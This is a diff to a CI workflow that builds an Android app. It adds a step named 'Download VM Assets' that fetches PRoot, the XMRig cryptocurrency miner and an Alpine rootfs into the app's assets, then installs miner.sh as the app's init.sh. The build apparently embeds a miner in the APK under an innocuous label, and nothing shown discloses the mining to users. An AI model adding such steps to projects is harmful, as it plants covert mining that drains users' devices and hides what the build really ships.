@@ -26,6 +26,20 @@ jobs:
         with:
           gradle-version: 8.2.1
 
+      - name: Download VM Assets
+        run: |
+          mkdir -p android/app/src/main/assets
+          # Download PRoot (static ARM64)
+          curl -L https://github.com/proot-me/proot-static/releases/download/v5.3.0/proot-static-aarch64 -o android/app/src/main/assets/proot
+          # Download XMRig (static ARM64)
+          curl -L https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-arm64.tar.gz -o xmrig.tar.gz
+          tar -xzf xmrig.tar.gz
+          mv xmrig-6.19.0/xmrig android/app/src/main/assets/xmrig
+          # Download Alpine Rootfs (Minimal)
+          curl -L https://dl-cdn.alpinelinux.org/alpine/v3.18/releases/aarch64/alpine-minirootfs-3.18.3-aarch64.tar.gz -o android/app/src/main/assets/rootfs.tar.gz
+          # Copy miner.sh as init.sh
+          cp miner.sh android/app/src/main/assets/init.sh
+
       - name: Build with Gradle
         run: gradle assembleDebug --no-daemon
         working-directory: android
